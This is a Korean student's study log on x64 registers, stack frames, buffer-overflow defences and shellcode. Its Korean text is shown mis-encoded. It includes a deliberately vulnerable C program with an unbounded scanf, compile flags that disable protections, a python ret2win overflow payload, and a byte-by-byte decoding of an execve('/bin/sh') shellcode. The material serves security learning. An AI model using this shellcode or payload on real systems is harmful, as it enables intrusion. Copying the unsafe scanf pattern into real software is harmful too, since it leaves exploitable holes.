# ğŸ“… YYYY.MM.DD Study Log

## ğŸ“Œ ì˜¤ëŠ˜ ë°°ìš´ ê°œë… ìš”ì•½

- 
- 
- 

---

## âœ… Buffer Overflow ë°©ì–´ ê¸°ìˆ  (ì •ë¦¬ ì˜ˆì‹œ)

###rax, rbx, rsp, rbp ë¥¼ ë°°ì› ë‹¤.
rbp (base pointer) ==> í•¨ìˆ˜ì˜ ì‹œì‘ì£¼ì†Œ. 
rsp (stack pointer) ==> ìŠ¤íƒì˜ ìµœìƒë‹¨ ì£¼ì†Œ. ë§ˆì¹˜ í•˜ë…¸ì´íƒ‘ ë§¨ìœ„! (ë‹¤ë§Œ ì‹¤ì œ ì£¼ì†Œê°’ì€ ìœ„ê°€ 0 ë°‘ì´ ffffffff ì´ë‹¤.) ìœ„ì—ì„œë¶€í„° ë‚®ì€ì£¼ì†Œë¼ ìƒê°í•˜ë©´ í¸í•¨. 
rbx ==> ê°€ì¥ í° íŠ¹ì§•. ì–´ë–¤ í•¨ìˆ˜ ì‹¤í–‰ì „ rbxë¥¼ ì‚¬ìš©í•˜ë©´? í•¨ìˆ˜ ì‹¤í–‰ ì „ rbxì— ì €ì¥ëœ ê°’ì„ ë°˜ë“œì‹œ í•¨ìˆ˜ ì‹¤í–‰ í›„ ë³µì›í•¨.

ê·¸ë˜ì„œ rbxê°€ ë“¤ì–´ê°„ë‹¤í•˜ë©´  
ì–´ë–¤ í•¨ìˆ˜ì—ì„œ ë‹¤ë¥¸ í•¨ìˆ˜ë¡œ ê°”ì–´!  
push rbp  
mov rbp, rsp  
*push rbx*(ìŠ¤íƒ í”„ë ˆì„ ì´í›„ì— ì €ì¥í•˜ëŠ”ê²Œ ì›ì¹™)  
...  
pop rbx  
pop rbp   

- ê°€ì¥ ì‹ ê¸°í•œì ? ==> ìŠ¤íƒì—ì„œ ìŒ“ì˜€ë‹¤ê°€ ì‚¬ë¼ì§€ë©´ì„œ ëë‚œë‹¤! ë§ˆì¹˜ ì™ ì˜¬ë¼ê°”ë‹¤ ë‚´ë ¤ê°€ëŠ” ìì´ë¡œë“œë¡­? ã…‹ã…‹ã…‹ ì²˜ëŸ¼
- êµ‰ì¥íˆ ì²´ê³„ì ì´ê³  ì² ì €í•˜ë‹¤. ì´ ì•„ì´ë””ì–´ ì¡°ê¸ˆ ë©‹ìˆë‹¤.

í•¨ìˆ˜ì˜ ì¸ìëŠ” rdi, rsi, rdx, rcx, r8, r9 ìˆœìœ¼ë¡œ ì „ë‹¬.  
7ë²ˆì§¸ ì¸ìë¶€í„°ëŠ” ìŠ¤íƒì— ìŒ“ì¸ë‹¤. í•¨ìˆ˜ call ì§ì „ì— ìŠ¤íƒì— ìŒ“ì´ëŠ”ë° ìŒ“ì„ ë•ŒëŠ” ë§ˆì§€ë§‰ ì¸ìë¶€í„° ìŒ“ëŠ”ë‹¤. 7ë²ˆì¬ ì¸ìì˜ ì£¼ì†Œ - rbp ì´ì „ ê°’ ...  

---

##x64 í™˜ê²½ì—ì„œ ì¡´ì¬í•˜ëŠ” BOF ë°©ì–´ ê¸°ë²•ë“¤
1. **Canary** => sfp,ret ì˜ ì •ë³´ë¥¼ ì €ì¥í•  ë•Œ, bofê³µê²©ìœ¼ë¡œ ë®ì–´ì”Œì–´ì§€ëŠ” ê²ƒì„ ë°©ì§€í•˜ê¸° ìœ„í•´ sfpì™€ buffer ì‚¬ì´ì— ì„ì˜ì˜ ê°’ì„ ì¶”ê°€í•¨. ì´ê²Œ ë³€ì¡°ëœë‹¤? ==> bofë¡œ íƒì§€.
3. **ASLR**(Address Space Layout Randomization) ==> ë©”ëª¨ë¦¬ ëœë¤í™”.
4. **PIE**(Position Independent Execution)
5. **NX**(Non excutable)

![image](https://github.com/user-attachments/assets/2c709cf7-8554-41fd-89d6-5c266a306a07)
![image](https://github.com/user-attachments/assets/d963f3ad-1d72-4610-b77e-2642e1d5ccee)


#include <stdio.h>

void secret(){
        printf("You hacked me!\n");
}
int main(){
        char buf[64];

        printf("Input: ");
        scanf("%s", buf);

        printf("You typed: %s\n", buf);

        return 0;
}


í•´ë‹¹ ì½”ë“œì˜ scanfì˜ ì·¨ì•½ì ì„ í™œìš©í•˜ë ¤ bofë¥¼ ì‹œë„í–ˆë‹¤.
ì¡°ê±´ 

$gcc -g -fno-stack-protector -no-pie -o bof1 bof1.c
==> canary, aslr

íŒŒì¼ì— ì„¤ì •ëœ ë³´í˜¸ê¸°ë²• í™•ì¸?
checksec --file=íŒŒì¼ëª…

payload ì‘ì„±
buffer[64] + SFP[8] + ë®ì–´ì“¸ ì£¼ì†Œ[8]

gdb ./bof1
p $secret ==> secret í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ ì°¾ìŒ.
python3 -c 'print("A"*64 + "B"*8 + "í•´ë‹¹ ì£¼ì†Œ")' | ./bof1
//ì¶œë ¥: You hacked me!  

í™•ì¸í•´ë³´ë‹ˆ NXê°€ ì¼œì ¸ìˆë‹¤. ë‹¤ë§Œ NXëŠ” ìŠ¤íƒì—ì„œ ì‹¤í–‰ë˜ëŠ” ì‰˜ì½”ë“œë¥¼ ë§‰ëŠ” ê²ƒ! ë‚˜ëŠ” ê·¸ëƒ¥ ì£¼ì†Œë§Œ ë„£ì—ˆì„ ë¿.

---

ë¨¸ì‹ ì½”ë“œ?  
\x48\x31\xc0\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05  


***\x48\x31\xc0***  
\x48 ==> REX prefix ==> 64ë¹„íŠ¸ ì—°ì‚°í•œë‹¤. rax rbx ì“¸ê±°ë‹¤?  
\x31 ==> opcode  
\xc0 ==> ModR/M ë°”ì´íŠ¸. 11000000 (rax ë‘ê°œ ì“¸ê±°ë‹¤)    
       =<span style="font-size: 12px; color: pink">xor rax, rax</span>
       
***\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00***  
\x48 ==> REX prefix  
\xbb ==> mov r64,imm64  OR  mov r32,imm32      ==> ë¯¸ë¦¬ prifix í•´ë‘ì—ˆê¸°ì— movabs rbx, imm64 (ë§Œì•½ ì—†ìœ¼ë©´ 32bitë¡œ ì“°ì„)  
\x2f\x62\x69\x6e\x2f\x73\x68\x00 ==> ë¦¬í‹€ì—”ë””ì–¸ìœ¼ë¡œ '/bin/sh\0'  
       =<span style="font-size: 12px; color: pink">movabs rbx,  0x0068732f6e69622f</span>
       
***\x53***  
\x53 ==> push rbx (ë¦¬í‹€ì—”ë””ì–¸ í˜•ì‹ìœ¼ë¡œ ì €ì¥!!! )  
       = <span style="font-size: 12px; color: pink">push rbx</span>
       
***\x48\x89\xe7***  
\x48  
\x89 ==> mov r/m64, r64 "ì˜¤ë¥¸ìª½ ë ˆì§€ìŠ¤í„° ê°’ì„ ì™¼ìª½ì— ë³µì‚¬."  
\xe7 ==> 11100111 mod = 11, reg = 100, rsp = 111  
       = <span style="font-size: 12px; color: pink">mov rdi, rsp</span> (rdi ë ˆì§€ìŠ¤í„°ì— /bin/sh ë¬¸ìì—´ì˜ ì£¼ì†Œë¥¼ ë„£ìŒ)  
(ì°¸ê³ ìë£Œ)
![image](https://github.com/user-attachments/assets/00e78af8-872f-436e-aa93-639cd4fa5b7d)
![image](https://github.com/user-attachments/assets/1ab48fb3-2ebc-4576-b025-982a90972a25)

EAX	ECX	EDX	EBX	ESP	EBP	ESI	EDI  
000	001	010	011	100	101	110	111  

      
***\x48\x31\xf6***  
\x48 ìµìˆ™í•˜ì£ ?  
\x31 ==> opcode xor r/m64, r64  
\xf6 ==> 11110110 mod = 11, reg = 000???, rm = 110  
       = <span style="font-size: 12px; color: pink">xor rsi, rsi</span> (rsi ë ˆì§€ìŠ¤í„°ë¥¼ 0ìœ¼ë¡œ ì´ˆê¸°í™” = execveì˜ ë‘ë²ˆì§¸ ì¸ì NULL)  

***\x48\x31\xd2***  
\x48  
\x31  
\xd2 ==> mod = 11010010 mod = 11, reg = 010, rm = 010  
      = <span style="font-size: 12px; color: pink">xor rdx, rdx</span> (rdx ë ˆì§€ìŠ¤í„°ë¥¼ 0ìœ¼ë¡œ ì´ˆê¸°í™” = 3ë²ˆì§¸ ì¸ì NULL)  
      
***\xb0\x3b***  
\xb0 ==> mov al, immm8 (8ë¹„íŠ¸ë¥¼ alì— ë„£ëŠ”ë‹¤.)  
\x3b ==> 59(system call number 59.== execve)  
      = <span style="font-size: 12px; color: pink">mov al, 0x3b</span>
ì‹œìŠ¤í…œì½œ ë„˜ë²„ëŠ”  
/usr/include/x86_64-linux-gnu/asm/unistd_64.h ì—¬ê¸°ì„œ  catí•´ì„œ ì°¾ì•„ë³´ë©´ ë¨.  

***\x0f\x05***  
      = <span style="font-size: 12px; color: pink">syscall</span>

ëª¨ë‘ í•©ì¹˜ë©´?  
xor rax, rax  
movabs rbx,  0x0068732f6e69622f  
push rbx  
mov rdi, rsp  
xor rsi, rsi  
xor rdx, rdx  
mov al, 0x3b  
syscall   

---

##rip(register instruction pointer) ë ˆì§€ìŠ¤í„°, 32bit ì—ì„œëŠ” eip

- instruction = cpuê°€ ì²˜ë¦¬í•˜ëŠ” ê¸°ê³„ì–´(ëª…ë ¹ì–´).
- ripëŠ” CPUê°€ ì²˜ë¦¬í•  ë‹¤ìŒ ëª…ë ¹ì–´ì˜ ì£¼ì†Œë¥¼ ê°€ì§.
- ì¦‰, ëª…ë ¹1ì´ ì‹¤í–‰ë  ë•Œ ëª…ë ¹2ì˜ ì£¼ì†Œë¥¼ ê°–ê³  ìˆìŒ. ëë‚˜ë©´ ëª…ë ¹2ë¥¼ ì‹¤í–‰í•  ë•Œ ripëŠ” ëª…ë ¹3ì˜ ì£¼ì†Œë¥¼ ê°–ê³  ìˆìŒ
- "ë‹¤ìŒì€ ì—¬ê¸°ì•¼!" ë¼ê³  ì§€ì •í•´ì£¼ëŠ” í™”ì‚´í‘œ.
- ê¸°ë³¸ì ìœ¼ë¡œ instructionì˜ í¬ê¸° 

##í•¨ìˆ˜ Aê°€ ì‹¤í–‰ì¤‘ ë‹¤ë¥¸ í•¨ìˆ˜ Bë¥¼ ë§Œë‚¬ë‹¤.
#**call** í•¨ìˆ˜B (opcode)
- push rip(ë‹¤ìŒ ì‹¤í–‰ ì£¼ì†Œë¥¼ ìŠ¤íƒì— ë„£ëŠ”ë‹¤ == ë¦¬í„´í•  ì£¼ì†Œ)
- jmp í•¨ìˆ˜Bì˜ ì£¼ì†Œ

***ìŠ¤íƒ í”„ë ˆì„***
- psuh rbp
- mov rbp, rsp
- sub rsp, í• ë‹¹í¬ê¸° ==> ìŠ¤íƒí”„ë ˆì„ì˜ ì´ˆê¸° í¬ê¸°ë¥¼ ì •í•¨!
...
#**leave**
- mov rsp, rbp ==> í•´ì£¼ëŠ” ì´ìœ . "add rspë¥¼ ë™ì¼í•˜ê²Œ í•˜ë©´ ë˜ëŠ” ê±° ì•„ë‹Œê°€?" NO ì¤‘ê°„ì— í”„ë ˆì„ì˜ í¬ê¸°ê°€ ì»¤ì§€ê±°ë‚˜ ì‘ì•„ì§ˆ ìˆ˜ ìˆê¸°ì— ìŠ¤íƒí”„ë ˆì„ì˜ ì‹œì‘ rbpë¡œ ì´ˆê¸°í™” í•´ì£¼ëŠ” ê²ƒ.
- pop rbp
#**ret**
- pop rip(ì´ì „ì— ì €ì¥í•´ë‘” ë¦¬í„´í•  ì£¼ì†Œë¥¼ ripì— ì „ë‹¬í•œë‹¤)
- jmp rip(í•´ë‹¹ ì£¼ì†Œë¡œ ì í”„í•œë‹¤.)

??? ì§ˆë¬¸. call, leave, retì€ ì™œ ì”€? ì–´ì°¨í”¼ í’€ì–´ì“°ë©´ ê¸°ê³„ì–´ì¸ë°.  
==> ì¼ì¼ì´ íƒ€ì´í•‘ ê·€ì°®ì•„. ì–´ì…ˆë¸”ë¦¬ì–´ë¥¼ ë§Œë“  CPUì œì¡°ì‚¬ì—ì„œ ë§Œë“ ê±°ì„. cpu ë‚´ë¶€ì—ì„œë§Œ ëŒì•„ê°€ëŠ” íë¦„ì œì–´. ì»¤ë„ê³¼ ìš´ì˜ì²´ì œ, ì‹œìŠ¤í…œì½œê³¼ëŠ” ìƒê´€X

---

## ğŸ§  ì˜¤ëŠ˜ì˜ ëŠë‚€ ì  â˜‘ï¸


---
## â“ ì˜¤ëŠ˜ì˜ ê¶ê¸ˆí•œ ì  ğŸ”


---

## ğŸ”– ë‚´ì¼ ëª©í‘œ ğŸ¯

- [ ] CTF ë¬¸ì œ 1ê°œ í’€ê³  write-up ì‘ì„±
- [ ] ì˜¤ëŠ˜ì˜ ê¶ê¸ˆí•œ ì  ì¤‘ 1ê°œëŠ” gdbë¡œ ì‹¤í—˜
- [ ] ì‰˜ì½”ë“œ íë¦„ ë³µìŠµ ë° ì‹œê°í™” ì •ë¦¬


